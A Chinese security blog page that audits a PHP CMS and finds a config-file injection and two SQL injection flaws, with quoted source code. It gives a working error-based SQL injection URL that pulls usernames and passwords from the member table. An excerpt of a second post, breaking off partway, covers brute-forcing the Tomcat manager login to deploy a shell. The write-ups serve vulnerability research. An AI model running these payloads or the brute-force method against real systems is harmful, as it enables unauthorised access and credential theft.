                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'menu_model'</span><span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">menu_model</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>

                    <span class="c1">// 导入默认数据</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
                        <span class="k">array</span><span class="p">(</span><span class="s1">'{dbprefix}'</span><span class="p">,</span> <span class="s1">'{site_url}'</span><span class="p">),</span>
                        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span> <span class="s1">'http://'</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">])),</span>
                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/default.sql'</span><span class="p">)</span>
                    <span class="p">));</span>
                    <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_url</span><span class="p">(</span><span class="s1">'install/index'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'step'</span> <span class="o">=&gt;</span> <span class="nv">$step</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))));</span>
                <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
                <span class="nv">$log</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="nv">$sql</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/install.sql'</span><span class="p">);</span>
                <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/`\{dbprefix\}(.+)`/U'</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$log</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
                    <span class="s1">'log'</span> <span class="o">=&gt;</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'&lt;finecms&gt;'</span><span class="p">,</span> <span class="nv">$log</span><span class="p">),</span>
                <span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
                <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install.lock'</span><span class="p">,</span> <span class="nb">time</span><span class="p">());</span>
                <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install.new'</span><span class="p">,</span> <span class="nb">time</span><span class="p">());</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
            <span class="s1">'step'</span> <span class="o">=&gt;</span> <span class="nv">$step</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'install_'</span><span class="o">.</span><span class="nv">$step</span><span class="o">.</span><span class="s1">'.html'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">);</span>
    <span class="p">}</span>

</code></pre></div></div>

然后定位到<code class="highlighter-rouge">$data['dbprefix']</code>是可控的，也就是数据库的表前缀，前面的数据库配置文件内容以及交代清楚，接下来构造一个POC：
<code class="highlighter-rouge">','x'=&gt;file_put_contents('s.txt','ss'),'b'=&gt;'b</code>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x01.jpg" alt="POC" />

这个POC是在数组中的，会在网站根目录新建一个<code class="highlighter-rouge">s.txt</code>内容为<code class="highlighter-rouge">ss</code>，在PHP的数组里，你可以放eval等字符，但是这个<code class="highlighter-rouge">database.php</code>是不能直接访问的，因为<code class="highlighter-rouge">if (!defined('BASEPATH')) exit('No direct script access allowed');</code>这一句是判断是否是框架初始化后加载此文件，否则就不再继续向下运行，好像这种思路都是框架常用的办法。

<h2 id="0x02-后台sql注入">0x02 后台SQL注入</h2>

第二处是在后台的某处搜索上，这个Input是一个日期输入框，但是不是原生的Input。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x02.jpg" alt="DATE" />

我们抓包看看请求：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x03.jpg" alt="Request" />

控制器文件位于：<code class="highlighter-rouge">diy\module\member\controllers\admin\Home.php</code>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x04.jpg" alt="Controller" />

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="sd">/**
     * 经验值
     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">experience</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_experience</span><span class="p">();</span>

        <span class="nv">$uid</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">);</span>
        <span class="nb">print_r</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">);</span>
        <span class="c1">// 根据参数筛选结果</span>
        <span class="nv">$param</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'uid'</span> <span class="o">=&gt;</span> <span class="nv">$uid</span><span class="p">,</span> <span class="s1">'type'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'search'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

        <span class="c1">// 数据库中分页查询</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">score_model</span><span class="o">-&gt;</span><span class="na">limit_page</span><span class="p">(</span><span class="nv">$param</span><span class="p">,</span> <span class="nb">max</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'page'</span><span class="p">),</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'total'</span><span class="p">));</span>
        <span class="nv">$param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">;</span>

        <span class="nv">$_param</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'search'</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">score_model</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span>
        <span class="nv">$_param</span> <span class="o">=</span> <span class="nv">$_param</span> <span class="o">?</span> <span class="nv">$param</span> <span class="o">+</span> <span class="nv">$_param</span> <span class="o">:</span> <span class="nv">$param</span><span class="p">;</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
            <span class="s1">'list'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
            <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nx">SITE_EXPERIENCE</span><span class="p">,</span>
            <span class="s1">'param'</span> <span class="o">=&gt;</span> <span class="nv">$_param</span><span class="p">,</span>
            <span class="s1">'pages'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_pagination</span><span class="p">(</span><span class="nx">dr_url</span><span class="p">(</span><span class="s1">'member/home/experience'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">),</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'total'</span><span class="p">])</span>
        <span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'score_index.html'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

Model文件：<code class="highlighter-rouge">diy\module\member\models\Score_model.php</code>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="cm">/*
   * 条件查询
   *
   * @param object  $select 查询对象
   * @param array $param  条件参数
   * @return  array 
   */</span>
  <span class="k">private</span> <span class="k">function</span> <span class="nf">_where</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$select</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span> <span class="p">{</span>
  
    <span class="nv">$_param</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">duri</span><span class="o">-&gt;</span><span class="na">uri</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="o">.</span><span class="nx">SITE_ID</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">ip_address</span><span class="p">()</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">user_agent</span><span class="p">());</span> <span class="c1">// 缓存文件名称</span>
    
    <span class="c1">// 存在POST提交时，重新生成缓存文件</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_POST</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span> <span class="c1">//这里就没有过滤</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
      <span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="c1">// 存在search参数时，读取缓存文件</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">);</span>
      <span class="nv">$_param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'end'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'inputtime BETWEEN '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span><span class="o">.</span><span class="s1">' AND '</span><span class="o">.</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'end'</span><span class="p">]);</span>
    <span class="p">}</span>
    
    <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'type'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]);</span>
    <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]);</span>
    <span class="nv">$_param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">];</span>
    
    <span class="k">return</span> <span class="nv">$_param</span><span class="p">;</span>
  <span class="p">}</span>
</code></pre></div></div>

故此出现了一个注入点：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x05.jpg" alt="SQL Injection" />

<h2 id="0x03-前台sql注入">0x03 前台SQL注入</h2>

文件位置：<code class="highlighter-rouge">diy\module\member\controllers\Account.php</code>，约：757行左右，出现一处变量未过滤的情况。

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="sd">/**
     * 附件管理
     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">attachment</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">dr_safe_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'ext'</span><span class="p">));</span>
        <span class="nv">$table</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'module'</span><span class="p">);</span> <span class="c1">// 这个变量没有过滤</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'attachment_model'</span><span class="p">);</span>

        <span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'page'</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
        
        <span class="c1">// 检测可管理的模块</span>
        <span class="nv">$module</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$modules</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'module'</span><span class="p">,</span> <span class="nx">SITE_ID</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$modules</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$modules</span> <span class="k">as</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$mod</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'module-'</span><span class="o">.</span><span class="nx">SITE_ID</span><span class="o">.</span><span class="s1">'-'</span><span class="o">.</span><span class="nv">$dir</span><span class="p">);</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_module_post_catid</span><span class="p">(</span><span class="nv">$mod</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">markrule</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$module</span><span class="p">[</span><span class="nv">$dir</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
        
        <span class="c1">// 查询结果</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$total</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">attachment_model</span><span class="o">-&gt;</span><span class="na">limit</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="p">,</span> <span class="nv">$page</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pagesize</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$table</span><span class="p">);</span>
        
        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'member'</span><span class="p">,</span> <span class="s1">'setting'</span><span class="p">,</span> <span class="s1">'permission'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">markrule</span><span class="p">,</span> <span class="s1">'attachsize'</span><span class="p">);</span>
        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$acount</span> <span class="o">?</span> <span class="nv">$acount</span> <span class="o">:</span> <span class="mi">1024000</span><span class="p">;</span>
        <span class="nv">$ucount</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="s1">'sum(`filesize`) as total'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'attachment'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">row_array</span><span class="p">();</span>
        <span class="nv">$ucount</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$ucount</span><span class="p">[</span><span class="s1">'total'</span><span class="p">];</span>
        <span class="nv">$acount</span> <span class="o">=</span> <span class="nv">$acount</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
        <span class="nv">$scount</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="nv">$acount</span> <span class="o">-</span> <span class="nv">$ucount</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
            <span class="s1">'ext'</span> <span class="o">=&gt;</span> <span class="nv">$ext</span><span class="p">,</span>
            <span class="s1">'list'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
            <span class="s1">'table'</span> <span class="o">=&gt;</span> <span class="nv">$table</span><span class="p">,</span>
            <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$module</span><span class="p">,</span>
            <span class="s1">'acount'</span> <span class="o">=&gt;</span> <span class="nv">$acount</span><span class="p">,</span>
            <span class="s1">'ucount'</span> <span class="o">=&gt;</span> <span class="nv">$ucount</span><span class="p">,</span>
            <span class="s1">'scount'</span> <span class="o">=&gt;</span> <span class="nv">$scount</span><span class="p">,</span>
            <span class="s1">'pages'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_member_pagination</span><span class="p">(</span><span class="nx">dr_member_url</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'ext'</span> <span class="o">=&gt;</span> <span class="nv">$ext</span><span class="p">)),</span> <span class="nv">$total</span><span class="p">),</span>
            <span class="s1">'page_total'</span> <span class="o">=&gt;</span> <span class="nv">$total</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'account_attachment_list.html'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<code class="highlighter-rouge">dr_safe_replace</code>函数：

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="sd">/**
 * 安全过滤函数
 *
 * @param $string
 * @return string
 */</span>
<span class="k">function</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%20'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%27'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%2527'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'*'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">'&amp;quot;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"'"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">';'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'&amp;gt;'</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"{"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'}'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

可见调用这个方法还是有用的，但是在官方代码中，<code class="highlighter-rouge">module</code>并没有过滤。

于是根据数据库结构构造EXP……

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x07.jpg" alt="POC" />

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x06.jpg" alt="POC" />

<code class="highlighter-rouge">index.php?s=member&amp;c=account&amp;m=attachment&amp;module=&amp;ext=pa&amp;module=d%" and(select 1 from(select count(*),concat((select (select (SELECT distinct concat('[',username,0x3a,password,'] by Coralab') FROM dr_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- x</code>

是不是看的很舒服？ 哈哈，这个基于框架的CMS漏洞还是很多的，抽空继续看，下班了、

<h2 id="0x04-总结">0x04 总结</h2>

框架中有很多过滤方法，但是开发人员并没有调用它们，虽说Module和Controller分开写没错，但是这个CMS目录结构很散，要不是我之前开发过漏洞平台，也许是看不懂它的加载的……没错，我现在也看不懂。挖掘SQL注入我主要是寻找数据库驱动，然后在query函数体内打印SQL语句，是不是很生猛？

后面有时间了继续总结~  周五了，可以嗨了！

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, August 18, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        代码审计 &nbsp;,
        
        php &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-17/2" > 渗透中tomcat部署war包Getshell</a>
    </div>
    <div class="post-excerpt">
      本文演示一下tomcat后台getshell
<!--more-->
<h2 id="tomcat-爆破">Tomcat 爆破</h2>

在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，类似于<code class="highlighter-rouge">http://192.168.3.204:8080/host-manager/html</code>

在这种情况下，我们都会选择去爆破来进入后台部署shell。

先抓取一下我们的登录包：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /host-manager/html HTTP/1.1
Host: 192.168.3.204:8080
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 FirePHP/0.7.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
x-insight: activate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46MTIzNDU2
</code></pre></div></div>
在Tomcat后台登录的数据包中我们发现它会将输入的账号和密码都编码成Base64密文。

格式：<code class="highlighter-rouge">用户名:密码</code> =&gt; <code class="highlighter-rouge">admin:123456</code> =&gt; <code class="highlighter-rouge">YWRtaW46MTIzNDU2</code>

这里我们可以采用Metasploit中的tomcat爆破辅助模块，当然也可以用BurpSuite来爆破：

将数据包发送到Intruder模块，添加一个变量：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x06.jpg" alt="Intruder" />

在设置Payload的时候要使用自定义迭代器：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x07.jpg" alt="Intruder" />

由于登录令牌都是<code class="highlighter-rouge">base64</code>加密的，我们需要 <code class="highlighter-rouge">[用户名]:[密码]</code>这样的格式进行<code class="highlighter-rouge">base64encde</code>才可以发送出去，我们设置三个迭代payload分别代表：用户名、:、密码、。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x08.jpg" alt="Intruder" />

第一位设置用户名这类的字典，可以多个。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x09.jpg" alt="payloads" />

第二位设置<code class="highlighter-rouge">:</code>，只需要一个即可。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x10.jpg" alt="payloads" />

第三位设置密码，可以多个。

然后设置一个编码器，选择<code class="highlighter-rouge">base64</code>这个函数：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x11.jpg" alt="encoder" />

接下来再将url编码去掉，因为在base64密文里<code class="highlighter-rouge">=</code>会被编码成<code class="highlighter-rouge">%3d</code>。

